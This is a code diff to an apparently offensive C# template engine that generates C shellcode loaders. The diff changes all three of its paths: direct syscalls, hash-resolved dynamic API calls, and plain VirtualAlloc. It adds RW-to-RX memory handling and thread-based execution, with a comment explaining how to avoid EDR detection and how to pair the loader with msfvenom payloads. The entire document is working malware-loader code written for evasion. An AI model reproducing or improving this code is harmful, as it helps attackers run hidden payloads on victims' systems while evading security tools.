@@ -652,13 +652,23 @@ public static class TemplateEngine
             Enumerable.Range(0, scHex.Length / 2).Select(i => $"0x{scHex.Substring(i * 2, 2)}"));
         int scLen = scHex.Length / 2;
 
+        // Pattern across all three paths:
+        //   1. Allocate RW (NOT RWX — RWX in heap is one of the first things any
+        //      EDR flags). Lifetime: process; we don't free.
+        //   2. Copy shellcode in. RtlCopyMemory is a memcpy alias from winnt.h.
+        //   3. Flip to RX. PAGE_EXECUTE_READ, not RWX.
+        //   4. Run on a fresh thread (CreateThread / NtCreateThreadEx) so the
+        //      shellcode gets its own stack and doesn't blend with the loader's.
+        //      Fire-and-forget — no WaitForSingleObject because we may be inside
+        //      DllMain holding the loader lock; pair with msfvenom EXITFUNC=thread
+        //      so the shellcode terminates its own thread cleanly when done.
         if (config.DirectSyscalls)
             return "static void do_payload(void) {\n"
                  + $"    unsigned char sc[] = {{{scBytes}}};\n"
                  + $"    PVOID mem = NULL; SIZE_T sz = {scLen}; ULONG old;\n"
                  + "    sc_NtAllocateVirtualMemory((HANDLE)-1, &mem, 0, &sz, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);\n"
                  + "    if (!mem) return;\n"
-                 + $"    for (SIZE_T i = 0; i < {scLen}; i++) ((BYTE*)mem)[i] = sc[i];\n"
+                 + $"    RtlCopyMemory(mem, sc, {scLen});\n"
                  + "    sc_NtProtectVirtualMemory((HANDLE)-1, &mem, &sz, PAGE_EXECUTE_READ, &old);\n"
                  + "    HANDLE hThread = NULL;\n"
                  + "    sc_NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, mem, NULL, 0, 0, 0, 0, NULL);\n"
@@ -669,21 +679,24 @@ public static class TemplateEngine
                  + $"    unsigned char sc[] = {{{scBytes}}};\n"
                  + "    fn_VirtualAlloc pVA = DINVOKE(H_KERNEL32_DLL, H_VIRTUALALLOC, fn_VirtualAlloc);\n"
                  + "    fn_VirtualProtect pVP = DINVOKE(H_KERNEL32_DLL, H_VIRTUALPROTECT, fn_VirtualProtect);\n"
-                 + "    if (!pVA || !pVP) return;\n"
+                 + "    fn_CreateThread pCT = DINVOKE(H_KERNEL32_DLL, H_CREATETHREAD, fn_CreateThread);\n"
+                 + "    if (!pVA || !pVP || !pCT) return;\n"
                  + $"    LPVOID mem = pVA(NULL, {scLen}, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);\n"
                  + "    if (!mem) return;\n"
-                 + $"    for (int i = 0; i < {scLen}; i++) ((BYTE*)mem)[i] = sc[i];\n"
+                 + $"    RtlCopyMemory(mem, sc, {scLen});\n"
                  + $"    DWORD old; pVP(mem, {scLen}, PAGE_EXECUTE_READ, &old);\n"
-                 + "    ((void(*)())mem)();\n"
+                 + "    HANDLE hThread = pCT(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);\n"
+                 + "    if (hThread) CloseHandle(hThread);\n"
                  + "}\n";
 
         return "static void do_payload(void) {\n"
              + $"    unsigned char sc[] = {{{scBytes}}};\n"
              + $"    LPVOID mem = VirtualAlloc(NULL, {scLen}, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);\n"
              + "    if (!mem) return;\n"
-             + $"    for (int i = 0; i < {scLen}; i++) ((BYTE*)mem)[i] = sc[i];\n"
+             + $"    RtlCopyMemory(mem, sc, {scLen});\n"
              + $"    DWORD old; VirtualProtect(mem, {scLen}, PAGE_EXECUTE_READ, &old);\n"
-             + "    ((void(*)())mem)();\n"
+             + "    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);\n"
+             + "    if (hThread) CloseHandle(hThread);\n"
              + "}\n";
     }
 
